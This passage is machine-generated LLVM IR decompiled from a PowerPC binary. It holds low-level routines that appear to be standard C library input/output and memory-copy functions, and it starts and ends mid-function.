  %v1_10006a68 = add i32 %v0_10006a60, 8
  %v2_10006a68 = inttoptr i32 %v1_10006a68 to i32*
  %v3_10006a68 = load i32, i32* %v2_10006a68, align 4
  store i32 %v3_10006a68, i32* %r9.global-to-local, align 4
  %v1_10006a6c = call i32 @__asm_rlwinm(i32 %v3_10006a60, i32 0, i32 26, i32 24)
  %v2_10006a6c = trunc i32 %v1_10006a6c to i16
  %v3_10006a70 = load i32, i32* @r29, align 4
  %v4_10006a70 = inttoptr i32 %v3_10006a70 to i16*
  store i16 %v2_10006a6c, i16* %v4_10006a70, align 2
  %v0_10006a74 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006a74 = load i32, i32* @r29, align 4
  %v2_10006a74 = add i32 %v1_10006a74, 28
  %v3_10006a74 = inttoptr i32 %v2_10006a74 to i32*
  store i32 %v0_10006a74, i32* %v3_10006a74, align 4
  br label %dec_label_pc_10006a78

dec_label_pc_10006a78:                            ; preds = %dec_label_pc_10006a50, %dec_label_pc_10006a40, %dec_label_pc_10006a38, %dec_label_pc_10006a60
  %v0_10006a7c = load i32, i32* @r28, align 4
  ret i32 %v0_10006a7c

; uselistorder directives
  uselistorder i32 %v3_10006a2c, { 1, 2, 0 }
  uselistorder i32 %v1_100069dc, { 1, 0 }
  uselistorder i32 %v2_10006920, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32 ()* @function_100067c0, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_10010438.216 to i32*), { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32* @global_var_10010494.196, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i16* %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10006a78, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10006a2c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006a10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100069d0, { 1, 0 }
  uselistorder label %dec_label_pc_10006998, { 1, 0 }
}

define i32 @function_10006a90(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10006a90:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_10006b38, label %dec_label_pc_10006ab0

dec_label_pc_10006ab0:                            ; preds = %dec_label_pc_10006a90
  store i32 %tmp, i32* @r31, align 4
  %v2_10006b183 = add i32 %arg2, -1
  store i32 %v2_10006b183, i32* @r29, align 4
  %v4_10006b209 = icmp eq i32 %arg2, 1
  br i1 %v4_10006b209, label %dec_label_pc_10006b24, label %dec_label_pc_10006ab8

dec_label_pc_10006ab8:                            ; preds = %dec_label_pc_10006ab0, %dec_label_pc_10006b18.backedge
  %v2_10006ad4 = phi i32 [ %v2_10006ad412, %dec_label_pc_10006b18.backedge ], [ %tmp, %dec_label_pc_10006ab0 ]
  %v0_10006ab8 = phi i32 [ %v0_10006b1c, %dec_label_pc_10006b18.backedge ], [ %arg3, %dec_label_pc_10006ab0 ]
  %v1_10006ab8 = add i32 %v0_10006ab8, 16
  %v2_10006ab8 = inttoptr i32 %v1_10006ab8 to i32*
  %v3_10006ab8 = load i32, i32* %v2_10006ab8, align 4
  %v1_10006abc = add i32 %v0_10006ab8, 24
  %v2_10006abc = inttoptr i32 %v1_10006abc to i32*
  %v3_10006abc = load i32, i32* %v2_10006abc, align 4
  %v2_10006ac0 = add i32 %v3_10006ab8, 1
  store i32 %v2_10006ac0, i32* %r11.global-to-local, align 4
  %v3_10006ac4 = icmp ult i32 %v3_10006ab8, %v3_10006abc
  %v5_10006ac4 = icmp eq i32 %v3_10006ab8, %v3_10006abc
  store i1 %v5_10006ac4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10006ac4, label %dec_label_pc_10006acc, label %dec_label_pc_10006ae8

dec_label_pc_10006acc:                            ; preds = %dec_label_pc_10006ab8
  %v4_10006ab8 = inttoptr i32 %v3_10006ab8 to i8*
  %v3_10006acc = load i8, i8* %v4_10006ab8, align 1
  %v3_10006ad0 = icmp eq i8 %v3_10006acc, 10
  store i1 %v3_10006ad0, i1* %cr7_eq.global-to-local, align 1
  %v3_10006ad4 = inttoptr i32 %v2_10006ad4 to i8*
  store i8 %v3_10006acc, i8* %v3_10006ad4, align 1
  %v0_10006ad8 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006ad8 = load i32, i32* @r30, align 4
  %v2_10006ad8 = add i32 %v1_10006ad8, 16
  %v3_10006ad8 = inttoptr i32 %v2_10006ad8 to i32*
  store i32 %v0_10006ad8, i32* %v3_10006ad8, align 4
  %v0_10006adc = load i32, i32* @r31, align 4
  %v1_10006adc = add i32 %v0_10006adc, 1
  store i32 %v1_10006adc, i32* @r31, align 4
  %v0_10006ae0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10006ae0, label %dec_label_pc_10006b24, label %dec_label_pc_10006b18.backedge

dec_label_pc_10006ae8:                            ; preds = %dec_label_pc_10006ab8
  %v1_10006b1c10 = inttoptr i32 %v0_10006ab8 to i16*
  store i32 268462828, i32* @lr, align 4
  %v5_10006ae8 = call i32 @function_1000a2ac(i16* %v1_10006b1c10, i32 %v3_10006ab8)
  %v6_10006ae8 = trunc i32 %v5_10006ae8 to i8
  %v4_10006aec = icmp eq i8 %v6_10006ae8, -1
  store i1 %v4_10006aec, i1* %cr7_eq.global-to-local, align 1
  %v3_10006af4 = icmp eq i8 %v6_10006ae8, 10
  store i1 %v3_10006af4, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10006aec, label %dec_label_pc_10006afc, label %dec_label_pc_10006b0c

dec_label_pc_10006afc:                            ; preds = %dec_label_pc_10006ae8
  %v0_10006afc = load i32, i32* @r30, align 4
  %v1_10006afc = inttoptr i32 %v0_10006afc to i16*
  %v2_10006afc = load i16, i16* %v1_10006afc, align 2
  %v1_10006b00 = and i16 %v2_10006afc, 8
  %v3_10006b00 = icmp eq i16 %v1_10006b00, 0
  br i1 %v3_10006b00, label %dec_label_pc_10006afc.dec_label_pc_10006b24_crit_edge, label %dec_label_pc_10006b38

dec_label_pc_10006afc.dec_label_pc_10006b24_crit_edge: ; preds = %dec_label_pc_10006afc
  %v0_10006b24.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10006b24

dec_label_pc_10006b0c:                            ; preds = %dec_label_pc_10006ae8
  %v3_10006b0c = load i32, i32* @r31, align 4
  %v4_10006b0c = inttoptr i32 %v3_10006b0c to i8*
  store i8 %v6_10006ae8, i8* %v4_10006b0c, align 1
  %v0_10006b10 = load i32, i32* @r31, align 4
  %v1_10006b10 = add i32 %v0_10006b10, 1
  store i32 %v1_10006b10, i32* @r31, align 4
  %v0_10006b14 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10006b14, label %dec_label_pc_10006b24, label %dec_label_pc_10006b18.backedge

dec_label_pc_10006b18.backedge:                   ; preds = %dec_label_pc_10006b0c, %dec_label_pc_10006acc
  %v2_10006ad412 = phi i32 [ %v1_10006b10, %dec_label_pc_10006b0c ], [ %v1_10006adc, %dec_label_pc_10006acc ]
  %v0_10006b18 = load i32, i32* @r29, align 4
  %v2_10006b18 = add i32 %v0_10006b18, -1
  store i32 %v2_10006b18, i32* @r29, align 4
  %v0_10006b1c = load i32, i32* @r30, align 4
  %v4_10006b20 = icmp eq i32 %v0_10006b18, 1
  br i1 %v4_10006b20, label %dec_label_pc_10006b24, label %dec_label_pc_10006ab8

dec_label_pc_10006b24:                            ; preds = %dec_label_pc_10006b0c, %dec_label_pc_10006b18.backedge, %dec_label_pc_10006acc, %dec_label_pc_10006ab0, %dec_label_pc_10006afc.dec_label_pc_10006b24_crit_edge
  %v2_10006b30 = phi i32 [ %v0_10006b24.pre, %dec_label_pc_10006afc.dec_label_pc_10006b24_crit_edge ], [ %tmp, %dec_label_pc_10006ab0 ], [ %v1_10006adc, %dec_label_pc_10006acc ], [ %v2_10006ad412, %dec_label_pc_10006b18.backedge ], [ %v1_10006b10, %dec_label_pc_10006b0c ]
  %v1_10006b24 = load i32, i32* @r28, align 4
  %v3_10006b24 = icmp ugt i32 %v2_10006b30, %v1_10006b24
  %v4_10006b24 = icmp eq i32 %v2_10006b30, %v1_10006b24
  store i1 %v4_10006b24, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10006b24, label %dec_label_pc_10006b2c, label %dec_label_pc_10006b38

dec_label_pc_10006b2c:                            ; preds = %dec_label_pc_10006b24
  %v3_10006b30 = inttoptr i32 %v2_10006b30 to i8*
  store i8 0, i8* %v3_10006b30, align 1
  %v0_10006b40.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10006b3c

dec_label_pc_10006b38:                            ; preds = %dec_label_pc_10006afc, %dec_label_pc_10006b24, %dec_label_pc_10006a90
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10006b3c

dec_label_pc_10006b3c:                            ; preds = %dec_label_pc_10006b2c, %dec_label_pc_10006b38
  %v0_10006b40 = phi i32 [ %v0_10006b40.pre, %dec_label_pc_10006b2c ], [ 0, %dec_label_pc_10006b38 ]
  ret i32 %v0_10006b40

; uselistorder directives
  uselistorder i32 %v2_10006b30, { 0, 2, 1 }
  uselistorder i8 %v6_10006ae8, { 1, 0, 2 }
  uselistorder i32 %v3_10006abc, { 1, 0 }
  uselistorder i32 %v3_10006ab8, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_10006ab8, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10006b3c, { 1, 0 }
  uselistorder label %dec_label_pc_10006b38, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006b24, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_10006ab8, { 1, 0 }
}

define i32 @function_10006b54(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10006b54:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i16*
  %tmp7 = sext i8 %arg1 to i32
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  store i32 %arg2, i32* @r31, align 4
  store i32 %tmp7, i32* @r30, align 4
  %v2_10006b6c = add i32 %arg2, 16
  %v3_10006b6c = inttoptr i32 %v2_10006b6c to i32*
  %v4_10006b6c = load i32, i32* %v3_10006b6c, align 4
  store i32 %v4_10006b6c, i32* %r11.global-to-local, align 4
  %v2_10006b70 = add i32 %arg2, 28
  %v3_10006b70 = inttoptr i32 %v2_10006b70 to i32*
  %v4_10006b70 = load i32, i32* %v3_10006b70, align 4
  %v2_10006b74 = icmp ult i32 %v4_10006b6c, %v4_10006b70
  br i1 %v2_10006b74, label %dec_label_pc_10006b7c, label %dec_label_pc_10006b90

dec_label_pc_10006b7c:                            ; preds = %dec_label_pc_10006b54
  %v1_10006b7c1 = zext i8 %arg1 to i32
  %v1_10006b80 = add i32 %v4_10006b6c, 1
  store i32 %v1_10006b80, i32* %r9.global-to-local, align 4
  store i32 %v1_10006b7c1, i32* %r3.global-to-local, align 4
  %v3_10006b88 = inttoptr i32 %v4_10006b6c to i8*
  store i8 %arg1, i8* %v3_10006b88, align 1
  %v0_10006c34.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10006c34.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10006c34

dec_label_pc_10006b90:                            ; preds = %dec_label_pc_10006b54
  %v3_10006b90 = load i16, i16* %tmp, align 2
  %v4_10006b90 = zext i16 %v3_10006b90 to i32
  %v1_10006b94 = call i32 @__asm_rlwinm(i32 %v4_10006b90, i32 0, i32 24, i32 25)
  %v3_10006b98 = icmp eq i32 %v1_10006b94, 192
  br i1 %v3_10006b98, label %dec_label_pc_10006bb4, label %dec_label_pc_10006ba0

dec_label_pc_10006ba0:                            ; preds = %dec_label_pc_10006b90
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 128, i32* @r4, align 4
  store i32 268463020, i32* @lr, align 4
  %v3_10006ba8 = call i32 @function_1000993c(i16* nonnull %tmp)
  store i32 %v3_10006ba8, i32* %r3.global-to-local, align 4
  %v3_10006bac = icmp eq i32 %v3_10006ba8, 0
  br i1 %v3_10006bac, label %dec_label_pc_10006bb4, label %dec_label_pc_10006c60

dec_label_pc_10006bb4:                            ; preds = %dec_label_pc_10006ba0, %dec_label_pc_10006b90
  %v0_10006bb4 = load i32, i32* @r31, align 4
  %v1_10006bb4 = add i32 %v0_10006bb4, 4
  %v2_10006bb4 = inttoptr i32 %v1_10006bb4 to i32*
  %v3_10006bb4 = load i32, i32* %v2_10006bb4, align 4
  %v0_10006bb8 = load i32, i32* @r30, align 4
  %v1_10006bb8 = urem i32 %v0_10006bb8, 256
  store i32 %v1_10006bb8, i32* %r3.global-to-local, align 4
  %v3_10006bbc = icmp eq i32 %v3_10006bb4, -2
  br i1 %v3_10006bbc, label %dec_label_pc_10006c64, label %dec_label_pc_10006bc4

dec_label_pc_10006bc4:                            ; preds = %dec_label_pc_10006bb4
  %v1_10006bc4 = add i32 %v0_10006bb4, 12
  %v2_10006bc4 = inttoptr i32 %v1_10006bc4 to i32*
  %v3_10006bc4 = load i32, i32* %v2_10006bc4, align 4
  store i32 %v3_10006bc4, i32* %r9.global-to-local, align 4
  %v1_10006bc8 = add i32 %v0_10006bb4, 8
  %v2_10006bc8 = inttoptr i32 %v1_10006bc8 to i32*
  %v3_10006bc8 = load i32, i32* %v2_10006bc8, align 4
  %v4_10006bcc = icmp eq i32 %v3_10006bc4, %v3_10006bc8
  br i1 %v4_10006bcc, label %dec_label_pc_10006c3c, label %dec_label_pc_10006bd4

dec_label_pc_10006bd4:                            ; preds = %dec_label_pc_10006bc4
  %v1_10006bd4 = add i32 %v0_10006bb4, 16
  %v2_10006bd4 = inttoptr i32 %v1_10006bd4 to i32*
  %v3_10006bd4 = load i32, i32* %v2_10006bd4, align 4
  %v4_10006bd8 = icmp eq i32 %v3_10006bc4, %v3_10006bd4
  br i1 %v4_10006bd8, label %dec_label_pc_10006be0, label %dec_label_pc_10006bf0

dec_label_pc_10006be0:                            ; preds = %dec_label_pc_10006bd4
  store i32 %v0_10006bb4, i32* @r3, align 4
  store i32 268463080, i32* @lr, align 4
  %v0_10006be4 = call i32 @function_10005544()
  store i32 %v0_10006be4, i32* %r3.global-to-local, align 4
  %v3_10006be8 = icmp eq i32 %v0_10006be4, 0
  br i1 %v3_10006be8, label %dec_label_pc_10006be0.dec_label_pc_10006bf0_crit_edge, label %dec_label_pc_10006c60

dec_label_pc_10006be0.dec_label_pc_10006bf0_crit_edge: ; preds = %dec_label_pc_10006be0
  %v0_10006bf0.pre = load i32, i32* @r31, align 4
  %v0_10006bf4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10006bf0

dec_label_pc_10006bf0:                            ; preds = %dec_label_pc_10006be0.dec_label_pc_10006bf0_crit_edge, %dec_label_pc_10006bd4
  %v0_10006bf4 = phi i32 [ %v0_10006bf4.pre, %dec_label_pc_10006be0.dec_label_pc_10006bf0_crit_edge ], [ %v0_10006bb8, %dec_label_pc_10006bd4 ]
  %v0_10006bf0 = phi i32 [ %v0_10006bf0.pre, %dec_label_pc_10006be0.dec_label_pc_10006bf0_crit_edge ], [ %v0_10006bb4, %dec_label_pc_10006bd4 ]
  %v1_10006bf0 = add i32 %v0_10006bf0, 16
  %v2_10006bf0 = inttoptr i32 %v1_10006bf0 to i32*
  %v3_10006bf0 = load i32, i32* %v2_10006bf0, align 4
  store i32 %v3_10006bf0, i32* %r9.global-to-local, align 4
  %v1_10006bf4 = urem i32 %v0_10006bf4, 256
  store i32 %v1_10006bf4, i32* %r11.global-to-local, align 4
  %v1_10006bf8 = trunc i32 %v0_10006bf4 to i8
  %v3_10006bf8 = inttoptr i32 %v3_10006bf0 to i8*
  store i8 %v1_10006bf8, i8* %v3_10006bf8, align 1
  %v0_10006bfc = load i32, i32* %r9.global-to-local, align 4
  %v1_10006bfc = add i32 %v0_10006bfc, 1
  store i32 %v1_10006bfc, i32* %r9.global-to-local, align 4
  %v1_10006c00 = load i32, i32* @r31, align 4
  %v2_10006c00 = add i32 %v1_10006c00, 16
  %v3_10006c00 = inttoptr i32 %v2_10006c00 to i32*
  store i32 %v1_10006bfc, i32* %v3_10006c00, align 4
  %v0_10006c04 = load i32, i32* @r31, align 4
  %v1_10006c04 = inttoptr i32 %v0_10006c04 to i16*
  %v2_10006c04 = load i16, i16* %v1_10006c04, align 2
  %v3_10006c04 = zext i16 %v2_10006c04 to i32
  %v1_10006c08 = and i32 %v3_10006c04, 256
  store i32 %v1_10006c08, i32* %r9.global-to-local, align 4
  %v3_10006c08 = icmp eq i32 %v1_10006c08, 0
  br i1 %v3_10006c08, label %dec_label_pc_10006c58, label %dec_label_pc_10006c10

dec_label_pc_10006c10:                            ; preds = %dec_label_pc_10006bf0
  %v0_10006c10 = load i32, i32* %r11.global-to-local, align 4
  %v3_10006c10 = icmp eq i32 %v0_10006c10, 10
  br i1 %v3_10006c10, label %dec_label_pc_10006c18, label %dec_label_pc_10006c58

dec_label_pc_10006c18:                            ; preds = %dec_label_pc_10006c10
  store i32 %v0_10006c04, i32* @r3, align 4
  store i32 268463136, i32* @lr, align 4
  %v0_10006c1c = call i32 @function_10005544()
  store i32 %v0_10006c1c, i32* %r3.global-to-local, align 4
  %v3_10006c20 = icmp eq i32 %v0_10006c1c, 0
  br i1 %v3_10006c20, label %dec_label_pc_10006c58, label %dec_label_pc_10006c28

dec_label_pc_10006c28:                            ; preds = %dec_label_pc_10006c18
  %v0_10006c28 = load i32, i32* @r31, align 4
  %v1_10006c28 = add i32 %v0_10006c28, 16
  %v2_10006c28 = inttoptr i32 %v1_10006c28 to i32*
  %v3_10006c28 = load i32, i32* %v2_10006c28, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10006c30 = add i32 %v3_10006c28, -1
  store i32 %v1_10006c30, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10006c34

dec_label_pc_10006c34:                            ; preds = %dec_label_pc_10006b7c, %dec_label_pc_10006c28
  %v1_10006c34 = phi i32 [ %v1_10006c34.pre, %dec_label_pc_10006b7c ], [ %v0_10006c28, %dec_label_pc_10006c28 ]
  %v0_10006c34 = phi i32 [ %v0_10006c34.pre, %dec_label_pc_10006b7c ], [ %v1_10006c30, %dec_label_pc_10006c28 ]
  %v2_10006c34 = add i32 %v1_10006c34, 16
  %v3_10006c34 = inttoptr i32 %v2_10006c34 to i32*
  store i32 %v0_10006c34, i32* %v3_10006c34, align 4
  %v0_10006c74.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c64

dec_label_pc_10006c3c:                            ; preds = %dec_label_pc_10006bc4
  %v1_10006c3c = inttoptr i32 %v0_10006bb4 to i16*
  store i32 %v0_10006bb4, i32* %r3.global-to-local, align 4
  %v2_10006c40 = ptrtoint i8* %stack_var_-24 to i32
  store i32 1, i32* @r5, align 4
  %v6_10006c48 = trunc i32 %v0_10006bb8 to i8
  store i8 %v6_10006c48, i8* %stack_var_-24, align 1
  store i32 268463184, i32* @lr, align 4
  %v5_10006c4c = call i32 @function_100096f0(i16* %v1_10006c3c, i32 %v2_10006c40)
  store i32 %v5_10006c4c, i32* %r3.global-to-local, align 4
  %v3_10006c50 = icmp eq i32 %v5_10006c4c, 0
  br i1 %v3_10006c50, label %dec_label_pc_10006c60, label %dec_label_pc_10006c58

dec_label_pc_10006c58:                            ; preds = %dec_label_pc_10006c10, %dec_label_pc_10006c3c, %dec_label_pc_10006c18, %dec_label_pc_10006bf0
  %v0_10006c58 = load i32, i32* @r30, align 4
  %v1_10006c58 = urem i32 %v0_10006c58, 256
  store i32 %v1_10006c58, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c64

dec_label_pc_10006c60:                            ; preds = %dec_label_pc_10006be0, %dec_label_pc_10006ba0, %dec_label_pc_10006c3c
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c64

dec_label_pc_10006c64:                            ; preds = %dec_label_pc_10006bb4, %dec_label_pc_10006c58, %dec_label_pc_10006c34, %dec_label_pc_10006c60
  %v0_10006c74 = phi i32 [ %v1_10006bb8, %dec_label_pc_10006bb4 ], [ %v1_10006c58, %dec_label_pc_10006c58 ], [ %v0_10006c74.pre, %dec_label_pc_10006c34 ], [ -1, %dec_label_pc_10006c60 ]
  ret i32 %v0_10006c74

; uselistorder directives
  uselistorder i32 %v1_10006c58, { 1, 0 }
  uselistorder i32 %v0_10006bf4, { 1, 0 }
  uselistorder i32 %v1_10006bb8, { 1, 0 }
  uselistorder i32 %v0_10006bb8, { 1, 2, 0 }
  uselistorder i32 %v0_10006bb4, { 2, 3, 0, 1, 4, 6, 5, 7 }
  uselistorder i32 %v4_10006b6c, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12, 0 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006c64, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10006c60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006c58, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10006c34, { 1, 0 }
}

define i32 @function_10006c78(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10006c78:
  store i32 %arg1, i32* @r3, align 4
  %v0_10006c90 = call i32 @function_10006ed8()
  store i32 %v0_10006c90, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_10006cac.242 to i32), i32* @lr, align 4
  %v4_10006ca8 = inttoptr i32 %arg2 to i16*
  %v5_10006ca8 = call i32 @function_10006cd4(i32 %arg1, i32 1, i32 %v0_10006c90, i16* %v4_10006ca8)
  %v1_10006cb0 = load i32, i32* @r27, align 4
  %v4_10006cb0 = icmp eq i32 %v5_10006ca8, %v1_10006cb0
  br i1 %v4_10006cb0, label %dec_label_pc_10006cb8, label %dec_label_pc_10006cbc

dec_label_pc_10006cb8:                            ; preds = %dec_label_pc_10006c78
  br label %dec_label_pc_10006cbc

dec_label_pc_10006cbc:                            ; preds = %dec_label_pc_10006c78, %dec_label_pc_10006cb8
  %v0_10006cbc = phi i32 [ -1, %dec_label_pc_10006c78 ], [ %v5_10006ca8, %dec_label_pc_10006cb8 ]
  ret i32 %v0_10006cbc

; uselistorder directives
  uselistorder label %dec_label_pc_10006cbc, { 1, 0 }
}

define i32 @function_10006cd4(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
dec_label_pc_10006cd4:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  %v3_10006cec = load i16, i16* %arg4, align 2
  %v4_10006cec = zext i16 %v3_10006cec to i32
  store i32 %tmp, i32* @r31, align 4
  store i32 128, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  %v1_10006cfc = call i32 @__asm_rlwinm(i32 %v4_10006cec, i32 0, i32 24, i32 25)
  %v3_10006d04 = icmp eq i32 %v1_10006cfc, 192
  br i1 %v3_10006d04, label %dec_label_pc_10006d18, label %dec_label_pc_10006d0c

dec_label_pc_10006d0c:                            ; preds = %dec_label_pc_10006cd4
  store i32 268463376, i32* @lr, align 4
  %v3_10006d0c = call i32 @function_1000993c(i16* nonnull %arg4)
  %v3_10006d10 = icmp eq i32 %v3_10006d0c, 0
  br i1 %v3_10006d10, label %dec_label_pc_10006d18, label %dec_label_pc_10006d70

dec_label_pc_10006d18:                            ; preds = %dec_label_pc_10006d0c, %dec_label_pc_10006cd4
  %v0_10006d18 = load i32, i32* @r29, align 4
  %v3_10006d18 = icmp eq i32 %v0_10006d18, 0
  %v0_10006d1c = load i32, i32* @r30, align 4
  %v3_10006d1c = icmp eq i32 %v0_10006d1c, 0
  %brmerge = or i1 %v3_10006d18, %v3_10006d1c
  br i1 %brmerge, label %dec_label_pc_10006d70, label %dec_label_pc_10006d28

dec_label_pc_10006d28:                            ; preds = %dec_label_pc_10006d18
  %v2_10006d30 = udiv i32 -1, %v0_10006d18
  %v0_10006d34 = load i32, i32* @r31, align 4
  %v3_10006d38 = icmp ugt i32 %v0_10006d1c, %v2_10006d30
  %v1_10006d50 = inttoptr i32 %v0_10006d34 to i16*
  br i1 %v3_10006d38, label %dec_label_pc_10006d50, label %dec_label_pc_10006d40

dec_label_pc_10006d40:                            ; preds = %dec_label_pc_10006d28
  %v0_10006d2c = load i32, i32* @r28, align 4
  %v2_10006d40 = mul i32 %v0_10006d1c, %v0_10006d18
  store i32 %v2_10006d40, i32* %r4.global-to-local, align 4
  store i32 268463432, i32* @lr, align 4
  %v5_10006d44 = call i32 @function_100097d0(i32 %v0_10006d2c, i32 %v2_10006d40, i16* %v1_10006d50)
  %v1_10006d48 = load i32, i32* @r29, align 4
  %v2_10006d48 = udiv i32 %v5_10006d44, %v1_10006d48
  store i32 %v2_10006d48, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10006d74

dec_label_pc_10006d50:                            ; preds = %dec_label_pc_10006d28
  %v2_10006d50 = load i16, i16* %v1_10006d50, align 2
  %v1_10006d54 = or i16 %v2_10006d50, 8
  store i16 %v1_10006d54, i16* %v1_10006d50, align 2
  %v0_10006d5c = call i32 @function_10004b48()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10006d68 = inttoptr i32 %v0_10006d5c to i32*
  store i32 22, i32* %v2_10006d68, align 4
  %v0_10006d78.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10006d74

dec_label_pc_10006d70:                            ; preds = %dec_label_pc_10006d18, %dec_label_pc_10006d0c
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10006d74

dec_label_pc_10006d74:                            ; preds = %dec_label_pc_10006d50, %dec_label_pc_10006d40, %dec_label_pc_10006d70
  %v0_10006d78 = phi i32 [ %v0_10006d78.pre, %dec_label_pc_10006d50 ], [ %v2_10006d48, %dec_label_pc_10006d40 ], [ 0, %dec_label_pc_10006d70 ]
  ret i32 %v0_10006d78

; uselistorder directives
  uselistorder i16* %v1_10006d50, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @function_100097d0, { 6, 1, 2, 4, 5, 0, 3 }
  uselistorder i32 (i16*)* @function_1000993c, { 1, 0 }
  uselistorder label %dec_label_pc_10006d74, { 2, 0, 1 }
}

define i32 @function_10006d8c() local_unnamed_addr {
dec_label_pc_10006d8c:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10006d8c = load i32, i32* @r5, align 4
  %v1_10006d8c = call i32 @__asm_rlwinm.(i32 %v0_10006d8c, i32 29, i32 3, i32 31)
  store i32 %v1_10006d8c, i32* %r9.global-to-local, align 4
  %v4_10006d8c = icmp eq i32 %v1_10006d8c, 0
  %v0_10006d90 = load i32, i32* @r4, align 4
  %v1_10006d90 = add i32 %v0_10006d90, -4
  store i32 %v1_10006d90, i32* %r4.global-to-local, align 4
  %v0_10006d94 = load i32, i32* @r3, align 4
  %v1_10006d94 = add i32 %v0_10006d94, -4
  store i32 %v1_10006d94, i32* @r11, align 4
  br i1 %v4_10006d8c, label %dec_label_pc_10006dbc, label %dec_label_pc_10006d9c

dec_label_pc_10006d9c:                            ; preds = %dec_label_pc_10006d8c
  %v1_10006d9c = urem i32 %v1_10006d94, 4
  %v3_10006d9c = icmp eq i32 %v1_10006d9c, 0
  br i1 %v3_10006d9c, label %dec_label_pc_10006da4, label %dec_label_pc_10006df8

dec_label_pc_10006da4:                            ; preds = %dec_label_pc_10006e18.dec_label_pc_10006da4_crit_edge, %dec_label_pc_10006d9c
  %v1_10006db0.pre = phi i32 [ %v1_10006d94, %dec_label_pc_10006d9c ], [ %v1_10006db0.pre.pre, %dec_label_pc_10006e18.dec_label_pc_10006da4_crit_edge ]
  %v0_10006da4 = phi i32 [ %v1_10006d8c, %dec_label_pc_10006d9c ], [ %v1_10006e18, %dec_label_pc_10006e18.dec_label_pc_10006da4_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_10006d9c ], [ %v2_10006e00, %dec_label_pc_10006e18.dec_label_pc_10006da4_crit_edge ]
  store i32 %v0_10006da4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10006da8

dec_label_pc_10006da8:                            ; preds = %dec_label_pc_10006da8, %dec_label_pc_10006da4
  %v1_10006db0 = phi i32 [ %v2_10006db4, %dec_label_pc_10006da8 ], [ %v1_10006db0.pre, %dec_label_pc_10006da4 ]
  %v0_10006da8 = load i32, i32* %r4.global-to-local, align 4
  %v1_10006da8 = add i32 %v0_10006da8, 4
  %v2_10006da8 = inttoptr i32 %v1_10006da8 to i32*
  %v3_10006da8 = load i32, i32* %v2_10006da8, align 4
  %v1_10006dac = add i32 %v0_10006da8, 8
